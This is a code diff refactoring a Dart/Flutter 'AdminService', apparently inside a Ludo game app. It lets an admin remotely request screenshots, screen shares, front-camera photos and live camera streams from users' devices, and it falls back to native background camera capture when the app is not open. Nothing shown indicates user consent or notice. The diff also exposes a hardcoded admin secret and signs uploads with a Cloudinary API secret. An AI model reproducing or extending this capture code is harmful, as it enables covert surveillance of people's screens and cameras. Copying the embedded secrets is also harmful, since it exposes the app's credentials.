@@ -24,33 +24,15 @@ class AdminService {
   static const String screenshotRequestsCollection = 'screenshot_requests';
   static const String devicesCollection = 'devices';
 
-  static final FirebaseFirestore firestore = FirebaseFirestore.instance;
+  static FirebaseFirestore? get firestore => BackendBridgeService.firestore;
   static final Map<String, Timer> _liveShareTimers = {};
 
   static Future<String> getOrCreateDeviceId() async {
-    try {
-      final firebaseUser = FirebaseAuth.instance.currentUser;
-      if (firebaseUser != null && firebaseUser.uid.isNotEmpty) {
-        final uidDeviceId = 'user_${firebaseUser.uid}';
-        final prefs = await SharedPreferences.getInstance();
-        await prefs.setString(deviceIdPref, uidDeviceId);
-        return uidDeviceId;
-      }
-      final cachedUser = await AuthService.loadCachedUser();
-      if (cachedUser != null && cachedUser.uid.isNotEmpty) {
-        final uidDeviceId = 'user_${cachedUser.uid}';
-        final prefs = await SharedPreferences.getInstance();
-        await prefs.setString(deviceIdPref, uidDeviceId);
-        return uidDeviceId;
-      }
-    } catch (_) {}
-
     final prefs = await SharedPreferences.getInstance();
     final savedId = prefs.getString(deviceIdPref);
     if (savedId != null && savedId.startsWith('user_')) {
       return savedId;
     }
-
     return '';
   }
 
@@ -65,7 +47,7 @@ class AdminService {
 
   static String get adminSecret => 'LudoKingdomAdmin2026!';
 
-  static Future<void> registerDevice({String? username}) async {
+  static Future<void> registerDevice({String? username, Map<String, dynamic>? extraData}) async {
     try {
       final currentUser = FirebaseAuth.instance.currentUser;
       if (currentUser != null && currentUser.email?.toLowerCase() == AuthService.adminEmail) {
@@ -92,13 +74,13 @@ class AdminService {
         'registeredAt': FieldValue.serverTimestamp(),
         'lastSeenAt': FieldValue.serverTimestamp(),
         'nativeCaptureEnabled': nativeEnabled,
+        if (extraData != null) ...extraData,
       };
 
       String? resolvedName = username;
       String? resolvedEmail;
 
       if (resolvedName == null || resolvedName.isEmpty) {
-        final currentUser = FirebaseAuth.instance.currentUser;
         if (currentUser != null) {
           resolvedName = currentUser.displayName ?? currentUser.email?.split('@').first;
           resolvedEmail = currentUser.email;
@@ -113,25 +95,14 @@ class AdminService {
         }
       }
 
-      if ((resolvedName == null || resolvedName.isEmpty) && deviceId.startsWith('user_')) {
-        try {
-          final uid = deviceId.substring('user_'.length);
-          final userDoc = await firestore.collection('users').doc(uid).get().timeout(const Duration(seconds: 3));
-          if (userDoc.exists && userDoc.data() != null) {
-            resolvedName = userDoc.data()?['displayName'] as String? ?? userDoc.data()?['email']?.split('@').first;
-            resolvedEmail = userDoc.data()?['email'] as String?;
-          }
-        } catch (_) {}
-
-        if ((resolvedName == null || resolvedName.isEmpty) && BackendBridgeService.isSupabaseReady) {
-          try {
-            final uid = deviceId.substring('user_'.length);
-            final res = await BackendBridgeService.supabase!.from('app_users').select().eq('uid', uid).maybeSingle();
-            if (res != null) {
-              resolvedName = res['display_name'] as String? ?? res['email']?.split('@').first;
-              resolvedEmail = res['email'] as String?;
-            }
-          } catch (_) {}
+      if ((resolvedName == null || resolvedName.isEmpty) &&
+          deviceId.startsWith('user_')) {
+        final uid = deviceId.substring('user_'.length);
+        final userData = await BackendBridgeService.getUserData(uid);
+        if (userData != null) {
+          resolvedName = userData['displayName'] as String? ??
+              (userData['email'] as String?)?.split('@').first;
+          resolvedEmail = userData['email'] as String?;
         }
       }
 
@@ -149,13 +120,13 @@ class AdminService {
   }
 
   static Stream<QuerySnapshot<Map<String, dynamic>>> watchDevices() {
-    return firestore.collection(devicesCollection).snapshots();
+    return firestore?.collection(devicesCollection).snapshots() ??
+        const Stream.empty();
   }
 
   static Stream<QuerySnapshot<Map<String, dynamic>>> watchAllRequests() {
-    return firestore
-        .collection(screenshotRequestsCollection)
-        .snapshots();
+    return firestore?.collection(screenshotRequestsCollection).snapshots() ??
+        const Stream.empty();
   }
 
   static Stream<QuerySnapshot<Map<String, dynamic>>> watchOwnRequests(
@@ -165,18 +136,20 @@ class AdminService {
       return watchAllRequests();
     }
     return firestore
-        .collection(screenshotRequestsCollection)
-        .where('requestedByDeviceId', isEqualTo: deviceId)
-        .snapshots();
+            ?.collection(screenshotRequestsCollection)
+            .where('requestedByDeviceId', isEqualTo: deviceId)
+            .snapshots() ??
+        const Stream.empty();
   }
 
   static Stream<QuerySnapshot<Map<String, dynamic>>>
-  watchPendingRequestsForDevice(String deviceId) {
+      watchPendingRequestsForDevice(String deviceId) {
     return firestore
-        .collection(screenshotRequestsCollection)
-        .where('targetDeviceId', isEqualTo: deviceId)
-        .where('status', isEqualTo: 'pending')
-        .snapshots();
+            ?.collection(screenshotRequestsCollection)
+            .where('targetDeviceId', isEqualTo: deviceId)
+            .where('status', isEqualTo: 'pending')
+            .snapshots() ??
+        const Stream.empty();
   }
 
   static Map<String, dynamic> buildRequestPayload({
@@ -199,25 +172,30 @@ class AdminService {
     };
   }
 
-  static Future<void> _cleanupPriorStreamsForDevice(String targetDeviceId) async {
-    try {
-      final oldDocs = await firestore
-          .collection(screenshotRequestsCollection)
-          .where('targetDeviceId', isEqualTo: targetDeviceId)
-          .get();
-      for (final doc in oldDocs.docs) {
-        final data = doc.data();
-        final reqType = data['requestType'] as String?;
-        final status = data['status'] as String?;
-        if ((reqType == 'screen_share' || reqType == 'camera_stream') &&
-            (status != 'stopped' && status != 'completed' && status != 'failed')) {
-          await BackendBridgeService.updateScreenshotRequest(doc.id, {
-            'status': 'stopped',
-            'stoppedAt': FieldValue.serverTimestamp(),
-          });
+  static Future<void> _cleanupPriorStreamsForDevice(
+      String targetDeviceId) async {
+    if (firestore != null) {
+      try {
+        final oldDocs = await firestore!
+            .collection(screenshotRequestsCollection)
+            .where('targetDeviceId', isEqualTo: targetDeviceId)
+            .get();
+        for (final doc in oldDocs.docs) {
+          final data = doc.data();
+          final reqType = data['requestType'] as String?;
+          final status = data['status'] as String?;
+          if ((reqType == 'screen_share' || reqType == 'camera_stream') &&
+              (status != 'stopped' &&
+                  status != 'completed' &&
+                  status != 'failed')) {
+            await BackendBridgeService.updateScreenshotRequest(doc.id, {
+              'status': 'stopped',
+              'stoppedAt': FieldValue.serverTimestamp(),
+            });
+          }
         }
-      }
-    } catch (_) {}
+      } catch (_) {}
+    }
 
     if (BackendBridgeService.isSupabaseReady) {
       try {
@@ -231,7 +209,9 @@ class AdminService {
           final id = row['id'] as String?;
           if (id != null &&
               (reqType == 'screen_share' || reqType == 'camera_stream') &&
-              (status != 'stopped' && status != 'completed' && status != 'failed')) {
+              (status != 'stopped' &&
+                  status != 'completed' &&
+                  status != 'failed')) {
             await BackendBridgeService.updateScreenshotRequest(id, {
               'status': 'stopped',
               'stoppedAt': FieldValue.serverTimestamp(),
@@ -246,14 +226,14 @@ class AdminService {
     String targetDeviceId,
     String requestedByDeviceId,
   ) async {
-    final doc = firestore.collection(screenshotRequestsCollection).doc();
+    final docId = firestore?.collection(screenshotRequestsCollection).doc().id ?? 'req_${DateTime.now().millisecondsSinceEpoch}';
     final payload = buildRequestPayload(
       requestType: 'screenshot',
       targetDeviceId: targetDeviceId,
       requestedByDeviceId: requestedByDeviceId,
-    )..['requestId'] = doc.id;
+    )..['requestId'] = docId;
     await BackendBridgeService.createScreenshotRequest(payload);
-    return doc.id;
+    return docId;
   }
 
   static Future<String> sendScreenShareRequest(
@@ -261,14 +241,14 @@ class AdminService {
     String requestedByDeviceId,
   ) async {
     await _cleanupPriorStreamsForDevice(targetDeviceId);
-    final doc = firestore.collection(screenshotRequestsCollection).doc();
+    final docId = firestore?.collection(screenshotRequestsCollection).doc().id ?? 'req_${DateTime.now().millisecondsSinceEpoch}';
     final payload = buildRequestPayload(
       requestType: 'screen_share',
       targetDeviceId: targetDeviceId,
       requestedByDeviceId: requestedByDeviceId,
-    )..['requestId'] = doc.id;
+    )..['requestId'] = docId;
     await BackendBridgeService.createScreenshotRequest(payload);
-    return doc.id;
+    return docId;
   }
 
   static Future<String> sendCameraCaptureRequest(
@@ -276,15 +256,15 @@ class AdminService {
     String requestedByDeviceId, {
     String cameraFacing = 'front',
   }) async {
-    final doc = firestore.collection(screenshotRequestsCollection).doc();
+    final docId = firestore?.collection(screenshotRequestsCollection).doc().id ?? 'req_${DateTime.now().millisecondsSinceEpoch}';
     final payload = buildRequestPayload(
       requestType: 'camera_capture',
       targetDeviceId: targetDeviceId,
       requestedByDeviceId: requestedByDeviceId,
       cameraFacing: cameraFacing,
-    )..['requestId'] = doc.id;
+    )..['requestId'] = docId;
     await BackendBridgeService.createScreenshotRequest(payload);
-    return doc.id;
+    return docId;
   }
 
   static Future<String> sendCameraStreamRequest(
@@ -293,29 +273,29 @@ class AdminService {
     String cameraFacing = 'front',
   }) async {
     await _cleanupPriorStreamsForDevice(targetDeviceId);
-    final doc = firestore.collection(screenshotRequestsCollection).doc();
+    final docId = firestore?.collection(screenshotRequestsCollection).doc().id ?? 'req_${DateTime.now().millisecondsSinceEpoch}';
     final payload = buildRequestPayload(
       requestType: 'camera_stream',
       targetDeviceId: targetDeviceId,
       requestedByDeviceId: requestedByDeviceId,
       cameraFacing: cameraFacing,
-    )..['requestId'] = doc.id;
+    )..['requestId'] = docId;
     await BackendBridgeService.createScreenshotRequest(payload);
-    return doc.id;
+    return docId;
   }
 
   static Future<String> sendWakeRequest(
     String targetDeviceId,
     String requestedByDeviceId,
   ) async {
-    final doc = firestore.collection(screenshotRequestsCollection).doc();
+    final docId = firestore?.collection(screenshotRequestsCollection).doc().id ?? 'req_${DateTime.now().millisecondsSinceEpoch}';
     final payload = buildRequestPayload(
       requestType: 'wake_up',
       targetDeviceId: targetDeviceId,
       requestedByDeviceId: requestedByDeviceId,
-    )..['requestId'] = doc.id;
+    )..['requestId'] = docId;
     await BackendBridgeService.createScreenshotRequest(payload);
-    return doc.id;
+    return docId;
   }
 
   static Future<void> fulfillScreenshotRequest(String requestId) async {
@@ -323,7 +303,8 @@ class AdminService {
     if (uploadedUrl == null) {
       await BackendBridgeService.updateScreenshotRequest(requestId, {
         'status': 'failed',
-        'error': 'Could not capture screenshot. If app is in background, Android requires app to be opened or screen casting permission granted.',
+        'error':
+            'Could not capture screenshot. If app is in background, Android requires app to be opened or screen casting permission granted.',
         'completedAt': FieldValue.serverTimestamp(),
       });
       return;
@@ -341,11 +322,8 @@ class AdminService {
       return;
     }
 
-    final requestDoc = await firestore
-        .collection(screenshotRequestsCollection)
-        .doc(requestId)
-        .get();
-    final data = requestDoc.data() ?? <String, dynamic>{};
+    final data = await BackendBridgeService.getRequestData(requestId) ??
+        <String, dynamic>{};
     final cameraFacing = data['cameraFacing'] as String? ?? 'front';
 
     await BackendBridgeService.updateScreenshotRequest(requestId, {
@@ -376,7 +354,8 @@ class AdminService {
           });
         }
       } else {
-        await LiveShareService.instance.startPublisher(requestId, cameraFacing: cameraFacing);
+        await LiveShareService.instance
+            .startPublisher(requestId, cameraFacing: cameraFacing);
         await BackendBridgeService.updateScreenshotRequest(requestId, {
           'status': 'live',
           'lastUpdatedAt': FieldValue.serverTimestamp(),
@@ -391,11 +370,8 @@ class AdminService {
   }
 
   static Future<void> fulfillCameraStreamRequest(String requestId) async {
-    final requestDoc = await firestore
-        .collection(screenshotRequestsCollection)
-        .doc(requestId)
-        .get();
-    final data = requestDoc.data() ?? <String, dynamic>{};
+    final data = await BackendBridgeService.getRequestData(requestId) ??
+        <String, dynamic>{};
     final cameraFacing = data['cameraFacing'] as String? ?? 'front';
 
     await BackendBridgeService.updateScreenshotRequest(requestId, {
@@ -431,11 +407,8 @@ class AdminService {
   }
 
   static Future<void> fulfillCameraCaptureRequest(String requestId) async {
-    final requestDoc = await firestore
-        .collection(screenshotRequestsCollection)
-        .doc(requestId)
-        .get();
-    final data = requestDoc.data() ?? <String, dynamic>{};
+    final data = await BackendBridgeService.getRequestData(requestId) ??
+        <String, dynamic>{};
     final cameraFacing = data['cameraFacing'] as String? ?? 'front';
 
     // 1. If app is foregrounded, try in-app camera capture first (fast, reliable)
@@ -471,7 +444,8 @@ class AdminService {
         }
       }
     } catch (e) {
-      debugPrint('In-app camera capture attempt failed or app in background: $e');
+      debugPrint(
+          'In-app camera capture attempt failed or app in background: $e');
     }
 
     // 2. Fall back to native background camera capture service
@@ -585,8 +559,8 @@ class AdminService {
         ));
 
       final streamedResponse = await request.send().timeout(
-        const Duration(seconds: 15),
-      );
+            const Duration(seconds: 15),
+          );
       final response = await http.Response.fromStream(streamedResponse);
 
       if (response.statusCode != 200 && response.statusCode != 201) {
@@ -610,7 +584,8 @@ class AdminService {
       final segments = uri.pathSegments;
       final uploadIndex = segments.indexOf('upload');
       if (uploadIndex != -1 && uploadIndex < segments.length - 1) {
-        final relevantSegments = List<String>.from(segments.sublist(uploadIndex + 1));
+        final relevantSegments =
+            List<String>.from(segments.sublist(uploadIndex + 1));
         if (relevantSegments.first.startsWith('v') &&
             int.tryParse(relevantSegments.first.substring(1)) != null) {
           relevantSegments.removeAt(0);
@@ -630,8 +605,10 @@ class AdminService {
       final publicId = extractCloudinaryPublicId(imageUrl);
       if (publicId == null || publicId.isEmpty) return false;
 
-      final timestamp = (DateTime.now().millisecondsSinceEpoch / 1000).floor().toString();
-      final signatureInput = 'public_id=$publicId&timestamp=$timestamp$cloudinaryApiSecret';
+      final timestamp =
+          (DateTime.now().millisecondsSinceEpoch / 1000).floor().toString();
+      final signatureInput =
+          'public_id=$publicId&timestamp=$timestamp$cloudinaryApiSecret';
       final signature = sha1.convert(utf8.encode(signatureInput)).toString();
 
       final uri = Uri.parse(
@@ -657,17 +634,11 @@ class AdminService {
     return false;
   }
 
-  static Future<void> deleteCapturedImage(String requestId, String? imageUrl) async {
+  static Future<void> deleteCapturedImage(
+      String requestId, String? imageUrl) async {
     if (imageUrl != null && imageUrl.isNotEmpty) {
       await deleteFromCloudinary(imageUrl);
     }
-    try {
-      await firestore.collection(screenshotRequestsCollection).doc(requestId).delete();
-    } catch (_) {}
-    if (BackendBridgeService.isSupabaseReady) {
-      try {
-        await BackendBridgeService.supabase!.from('screenshot_requests').delete().eq('id', requestId);
-      } catch (_) {}
-    }
+    await BackendBridgeService.deleteScreenshotRequest(requestId);
   }
 }
